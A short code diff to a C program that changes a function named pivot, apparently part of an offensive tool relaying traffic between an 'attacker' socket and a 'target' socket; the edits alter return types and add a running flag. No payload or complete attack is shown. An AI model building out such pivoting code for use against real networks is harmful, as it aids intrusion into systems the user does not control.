@@ -143,7 +143,7 @@ struct StringArray *get_dir_list(char *argv, int argc) {
     return NULL;
 }
 
-void* pivot(void *pinput) {
+int pivot(void *pinput) {
     ssize_t n;
     fd_set sockets;
     int attacker_sockfd = NULL;
@@ -191,7 +191,7 @@ void* pivot(void *pinput) {
         goto error;
     }
 
-
+    pivot_running = true;
     while (true) {
         FD_ZERO(&sockets);
         FD_SET((unsigned int)attacker_sockfd,&sockets);
@@ -243,7 +243,7 @@ void* pivot(void *pinput) {
     if (attacker_sockfd) close(attacker_sockfd);
     if (target_sockfd) close(target_sockfd);
     free(input);
-    return NULL;
+    return 0;
 
 
     error:
@@ -251,7 +251,7 @@ void* pivot(void *pinput) {
     if (target_sockfd) close(target_sockfd);
     if(input) free(input);
 
-    return NULL;
+    return -1;
 }
 int kill_pivot(){
         if(close_pipe[0] && close_pipe[1]){
